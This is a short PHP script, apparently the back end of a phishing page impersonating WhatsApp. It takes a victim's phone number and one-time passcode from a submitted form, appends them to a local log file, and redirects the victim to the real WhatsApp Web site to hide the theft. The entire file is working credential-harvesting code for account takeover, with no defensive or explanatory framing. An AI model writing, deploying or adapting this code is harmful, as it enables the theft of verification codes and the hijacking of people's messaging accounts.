<?php
file_put_contents("log.txt", "Phone: " . $_POST['phone'] . " OTP: " . $_POST['otp'] . "\n", FILE_APPEND);
header("Location: https://web.whatsapp.com/");
exit();
?>
